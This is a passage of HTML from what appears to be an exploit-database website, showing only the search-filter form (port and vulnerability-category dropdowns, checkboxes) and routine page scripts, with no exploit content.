                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
